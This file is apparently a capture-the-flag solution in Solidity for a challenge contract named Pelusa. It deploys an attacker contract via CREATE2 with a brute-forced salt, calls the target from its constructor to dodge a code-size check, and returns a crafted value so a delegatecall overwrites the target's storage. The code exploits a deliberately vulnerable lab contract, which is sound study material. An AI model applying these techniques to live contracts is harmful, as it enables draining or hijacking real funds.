// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengePelusa.sol";

contract PelusaDeployer {
    ChallengePelusaAttacker public attacker;

    constructor(address target) {
        bytes32 salt = calculateSalt(target);
        attacker = new ChallengePelusaAttacker{ salt: bytes32(salt) }(target);
    }

    function calculateSalt(address target) private view returns (bytes32) {
        uint256 salt = 0;
        bytes32 initHash = keccak256(abi.encodePacked(type(ChallengePelusaAttacker).creationCode, abi.encode(target)));

        while (true) {
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initHash));

            if (uint160(uint256(hash)) % 100 == 10) {
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}

contract ChallengePelusaAttacker is IGame {
    address private owner;
    uint256 public goals;

    Pelusa private pelusa;

    constructor(address _target) {
        pelusa = Pelusa(_target);
        pelusa.passTheBall();
    }

    function attack(address _deployer) external {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(_deployer, bytes32(uint256(0)))))));
        pelusa.shoot();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}
